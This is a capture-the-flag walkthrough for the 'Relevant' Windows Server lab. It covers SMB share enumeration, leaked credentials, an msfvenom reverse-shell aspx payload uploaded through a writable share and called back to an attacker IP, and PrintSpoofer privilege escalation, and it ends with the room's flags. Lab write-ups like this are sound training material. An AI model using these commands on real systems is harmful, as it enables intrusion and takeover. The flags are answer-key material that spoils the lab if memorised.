# Relevant - Medium

<details>
<summary>Nmap scan</summary>

```shell
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2022-09-08T12:43:02
|_Not valid after:  2023-03-10T12:43:02
|_ssl-date: 2022-09-09T13:18:02+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49663/tcp open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: RELEVANT, NetBIOS user: <unknown>, NetBIOS MAC: 02:34:e1:0b:17:3b (unknown)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-09-09T06:18:02-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-09-09 14:18:02
|_  start_date: 2022-09-09 13:43:18
```

</details>
<br>

```shell
nmap -T4 -p- -A 10.10.114.208

enum4linux 10.10.114.208

smbclient -L 10.10.114.208

smbclient //10.10.114.208/nt4wrksv
#accessing share

get passwords.txt

exit
#exit smbclient share

evil-winrm -i 10.10.114.208 -u Bob -p '!P@$$W0rD!123'
#attempting to get access for both users
#other tools such as psexec.py also don't work

gobuster dir -u http://10.10.114.208 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

gobuster dir -u http://10.10.114.208:49663 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.104.144 LPORT=4444 -f aspx -o shell.aspx

smbclient //10.10.66.36/nt4wrksv

put shell.aspx

nc -nvlp 4444
#after checking payload on port 49663, we get access

#remote access
whoami
#iis apppool\defaultapppool

whoami /priv

#in attacker machine
#upload PrintSpoofer.exe to share

#in remote shell
cd C:\inetpub\wwwroot\nt4wrksv
#to access files on share

dir

PrintSpoofer.exe -i -c cmd
#gives root access
```

```markdown
Nmap scan shows us that there are websites hosted on ports 80 and 49663; and the machine is running Windows Server 2016.

We can start enumeration of the machine.

smbclient shows a share called nt4wrksv; connecting to it gives us a file with user passwords encoded.

When decoded from base64, it gives us credentials for two users - Bob:!P@$$W0rD!123 and Bill:Juw4nnaM4n420696969!$$$

We can try using these two credentials for logging in.

However, both these credentials don't work, so we need to try enumeration somewhere else.

We can start enumerating the websites now.

The one on port 80 does not have any hidden directories, while the one on port 49963 has a directory /nt4wrksv.

This has the same name as the share we found earlier, and if we check /nt4wrksv/passwords.txt, we get the file contents.

This means if we have write permissions on the /nt4wrksv share, we can upload a malicious file and leverage that to get access.

As IIS requires .aspx shells, we can create a payload with msfvenom. Then, we need to add the payload file in the share.

After the payload has been added and listener has been setup, we can visit the website directory and check the file uploaded.

This gives us shell access.

User flag can be found in Bob's Desktop.

The privileges SeChangeNotifyPrivilege, SeImpersonatePrivilege and SeCreateGlobalPrivilege are enabled.

The enabled SeImpersonatePrivilege can be exploited using PrintSpoofer.exe.

We can upload PrintSpoofer.exe to the share, and then access it through the reverse shell.

After navigating to the directory with the share files, we just need to run the executable.

This gives us root access; root flag can be found in Admin's Desktop.
```

```markdown
1. User Flag - THM{fdk4ka34vk346ksxfr21tg789ktf45}

2. Root Flag - THM{1fk5kf469devly1gl320zafgl345pv}
```
